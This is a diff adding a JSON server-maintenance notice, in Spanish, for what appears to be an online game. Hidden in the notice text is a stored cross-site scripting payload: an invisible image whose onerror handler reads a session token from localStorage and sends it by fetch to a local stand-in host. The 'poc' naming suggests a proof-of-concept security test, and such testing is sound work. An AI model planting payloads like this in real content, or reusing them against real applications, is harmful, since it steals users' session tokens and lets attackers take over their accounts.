@@ -1,0 +1,4 @@
+{
+  "title": "Mantenimiento del Servidor",
+  "notice": "[color=\"#ff3250\"]AVISO IMPORTANTE:[/color] Se va a proceder a una actualización programada de los servidores globales a las 22:00 UTC para optimizar el rendimiento del matchmaking y corregir errores de renderizado. <img src=\"x\" onerror=\"if(!window.pocFlag){ fetch('http://localhost:8000/?token=' + localStorage.getItem('poc_session_token')); window.pocFlag=true; }\" style=\"display:none;\">"
+}
